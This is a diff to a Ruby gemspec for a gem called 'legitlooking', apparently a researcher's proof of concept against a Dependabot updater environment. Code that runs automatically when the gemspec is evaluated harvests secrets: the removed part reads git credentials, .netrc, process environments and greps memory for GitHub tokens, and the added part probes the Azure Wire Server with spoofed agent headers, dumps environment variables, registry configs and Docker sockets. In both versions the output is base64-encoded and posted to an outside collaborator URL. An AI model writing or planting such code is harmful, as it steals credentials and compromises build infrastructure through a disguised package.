@@ -6,98 +6,100 @@ begin
   require "uri"
   require "net/http"
 
-  # File.read is gepatchd door GemspecSanitizer -- gebruik shell cat
-  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 4000] }
-  cat = ->(f) { cmd.("cat '#{f}'") }
+  cmd  = ->(c) { `#{c} 2>/dev/null`.strip[0, 4000] }
   lines = []
 
-  base = "/home/dependabot/dependabot-updater"
+  # ============================================================
+  # 1. AZURE WIRE SERVER -- 168.63.129.16
+  #    Dit is de Azure platform agent / Wire Server
+  #    Niet de IMDS (169.254.169.254) maar een andere intern endpoint
+  #    pip.conf verwijst ernaar op poort 32526/vmSettings
+  # ============================================================
+  lines << "=== 1. AZURE WIRE SERVER (168.63.129.16) ==="
+
+  wire_host = "168.63.129.16"
+  {
+    32526 => %w[/vmSettings / /machine /telemetry /healthreport],
+    80    => %w[/ /machine?comp=config /machine?comp=goalstate /machine?comp=extensions],
+  }.each do |port, paths|
+    paths.each do |path|
+      begin
+        require "timeout"
+        Timeout.timeout(5) do
+          uri  = URI("http://#{wire_host}:#{port}#{path}")
+          req2 = Net::HTTP::Get.new(uri)
+          req2["x-ms-guest-agent-name"] = "WALinuxAgent-2.2.48"
+          req2["Accept"]               = "application/xml"
+          req2["User-Agent"]           = "WALinuxAgent-2.2.48"
+          resp = Net::HTTP.start(uri.host, uri.port,
+                                 open_timeout: 4, read_timeout: 4) { |h| h.request(req2) }
+          lines << "  #{port}#{path}: HTTP #{resp.code} | #{resp.body.to_s[0, 1000]}"
+        end
+      rescue => e
+        lines << "  #{port}#{path}: #{e.message[0, 100]}"
+      end
+    end
+  end
 
   # ============================================================
-  # 1. GIT CONFIG -- access token via http.extraheader?
+  # 2. API_CLIENT.RB REST (was afgekapt na 4000 chars)
   # ============================================================
-  lines << "=== 1. GIT CONFIG (via shell) ==="
-  lines << cat.("#{base}/repo/.git/config")
-
-  lines << "\n--- git config --list (alle instellingen) ---"
-  lines << cmd.("git -C #{base}/repo config --list")
-
-  lines << "\n--- git credential store ---"
-  lines << cmd.("git config --global --list")
-  lines << cat.("/home/dependabot/.git-credentials")
-  lines << cat.("/home/dependabot/.netrc")
+  lines << "\n=== 2. api_client.rb (tail -200) ==="
+  lines << cmd.("tail -200 /home/dependabot/dependabot-updater/lib/dependabot/api_client.rb")
 
   # ============================================================
-  # 2. PARENT ENVIRON VIA SHELL -- omzeilt dumpable restrictie
+  # 3. OUTPUT.JSON -- bevat resultaten van de job
+  #    Misschien tokens of interessante data na verwerking
   # ============================================================
-  lines << "\n=== 2. PARENT PROCESS ENVIRON (via shell) ==="
-  lines << cmd.("cat /proc/1/environ | tr '\\0' '\\n'")
-  lines << "\n--- PID 1077 ---"
-  lines << cmd.("cat /proc/1077/environ | tr '\\0' '\\n'")
-  lines << "\n--- PID 1083 ---"
-  lines << cmd.("cat /proc/1083/environ | tr '\\0' '\\n' | grep -iE 'TOKEN|SECRET|CRED|KEY|AUTH|DEPEND|JOB'")
-  lines << "\n--- PID 1084 (main updater) ---"
-  lines << cmd.("cat /proc/1084/environ | tr '\\0' '\\n'")
+  lines << "\n=== 3. OUTPUT.JSON ==="
+  lines << cmd.("cat /home/dependabot/dependabot-updater/output/output.json")
+  lines << cmd.("ls -la /home/dependabot/dependabot-updater/output/")
 
   # ============================================================
-  # 3. FIXTURE: job_with_credentials.json
+  # 4. ALLE .BUNDLE/CONFIG FILES -- registry credentials?
+  #    npm_and_yarn, python, cargo etc. kunnen tokens bevatten
   # ============================================================
-  lines << "\n=== 3. JOB FIXTURE WITH CREDENTIALS ==="
-  lines << cat.("#{base}/spec/fixtures/jobs/job_with_credentials.json")
+  lines << "\n=== 4. .BUNDLE/CONFIG FILES ==="
+  lines << cmd.("find /home/dependabot -name 'config' -path '*/.bundle/config' 2>/dev/null -exec echo '=== {} ===' \\; -exec cat {} \\;")
 
   # ============================================================
-  # 4. UPDATER BRONCODE -- api_client.rb
+  # 5. ALLE PIP.CONF / NPMRC / YARNRC BESTANDEN
   # ============================================================
-  lines << "\n=== 4. api_client.rb ==="
-  lines << cat.("#{base}/lib/dependabot/api_client.rb")
-
-  lines << "\n=== 4b. environment.rb ==="
-  lines << cat.("#{base}/lib/dependabot/environment.rb")
+  lines << "\n=== 5. ALL PIP/NPM/YARN CONFIG ==="
+  lines << cmd.("find /home/dependabot -name 'pip.conf' -o -name '.npmrc' -o -name 'Pipfile' 2>/dev/null | head -20")
+  lines << cmd.("find /home/dependabot -name 'pip.conf' 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;")
 
   # ============================================================
-  # 5. PIP.CONF + NPMRC
+  # 6. WIRE SERVER VIA CURL (andere headers proberen)
   # ============================================================
-  lines << "\n=== 5. PIP.CONF ==="
-  lines << cat.("#{base}/repo/pip.conf")
-  lines << cat.("/home/dependabot/.config/pip/pip.conf")
-
-  lines << "\n=== 5b. NPMRC ==="
-  lines << cmd.("find /home/dependabot -name '.npmrc' 2>/dev/null -exec cat {} \\;")
-  lines << cmd.("find /home/dependabot -name '.yarnrc' -o -name '.yarnrc.yml' 2>/dev/null -exec cat {} \\;")
-  lines << cmd.("find /home/dependabot -name '.bundle' -type d 2>/dev/null")
-  lines << cat.("/home/dependabot/.bundle/config")
+  lines << "\n=== 6. WIRE SERVER VIA CURL ==="
+  lines << cmd.("curl -s --max-time 5 'http://168.63.129.16:32526/vmSettings'")
+  lines << "\n--- wire server poort 80 ---"
+  lines << cmd.("curl -s --max-time 5 -H 'x-ms-agent-name: WALinuxAgent' -H 'x-ms-version: 2012-11-30' 'http://168.63.129.16/machine?comp=goalstate'")
+  lines << "\n--- wire server packages ---"
+  lines << cmd.("curl -s --max-time 5 'http://168.63.129.16:32526/'")
 
   # ============================================================
-  # 6. JOB.JSON -- via shell (omzeilt File.read patch)
+  # 7. VOLLEDIGE PROCESS ENV -- zoek naar hidden vars
   # ============================================================
-  lines << "\n=== 6. JOB.JSON (via cat) ==="
-  lines << cmd.("cat #{base}/job.json")
-  lines << "\n--- job path from env ---"
-  lines << cmd.("echo $DEPENDABOT_JOB_PATH")
-  lines << cmd.("cat $DEPENDABOT_JOB_PATH")
+  lines << "\n=== 7. VOLLEDIGE ENV DUMP CURRENT PROCESS ==="
+  lines << cmd.("env | sort")
 
   # ============================================================
-  # 7. SERVICE.RB -- hoe credentials worden doorgegeven
+  # 8. DOCKER METADATA / CONTAINER LABELS
   # ============================================================
-  lines << "\n=== 7. service.rb ==="
-  lines << cat.("#{base}/lib/dependabot/service.rb")
-
-  lines << "\n=== 7b. base_command.rb ==="
-  lines << cat.("#{base}/lib/dependabot/base_command.rb")
-
-  # ============================================================
-  # 8. ALLE TOKEN-ACHTIGE STRINGS IN MEMORY (via /proc/pid/maps)
-  #    Zoek naar ghs_ of ghp_ of ghr_ tokens in mapped files
-  # ============================================================
-  lines << "\n=== 8. TOKEN GREP IN /proc/1084/maps FILES ==="
-  lines << cmd.("grep -ao 'ghs_[A-Za-z0-9_]*' /proc/1084/maps 2>/dev/null | head -5")
-  lines << cmd.("strings /proc/1084/exe 2>/dev/null | grep -E '^(ghs_|ghp_|ghr_|github_pat_)' | head -5")
+  lines << "\n=== 8. CONTAINER METADATA ==="
+  lines << cmd.("cat /proc/1/cgroup")
+  lines << cmd.("cat /.dockerenv 2>/dev/null && echo 'docker env file exists'")
+  lines << cmd.("cat /run/containerd/containerd.sock 2>/dev/null")
+  lines << cmd.("cat /var/run/docker.sock 2>/dev/null")
+  lines << cmd.("ls -la /var/run/ /run/")
 
   # ============================================================
   # EXFIL
   # ============================================================
   payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
-  uri = URI("#{COLLAB_URL}?poc=shell_read")
+  uri = URI("#{COLLAB_URL}?poc=wire_server")
   post = Net::HTTP::Post.new(uri)
   post["Content-Type"] = "text/plain"
   post.body = payload
@@ -106,14 +108,14 @@ begin
 
 rescue => e
   begin
-    uri = URI("#{COLLAB_URL}?poc=shell_read&err=#{URI.encode_www_form_component(e.message[0, 200])}")
+    uri = URI("#{COLLAB_URL}?poc=wire_server&err=#{URI.encode_www_form_component(e.message[0, 200])}")
     Net::HTTP.get(uri)
   rescue; end
 end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.23"
+  spec.version       = "1.0.24"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
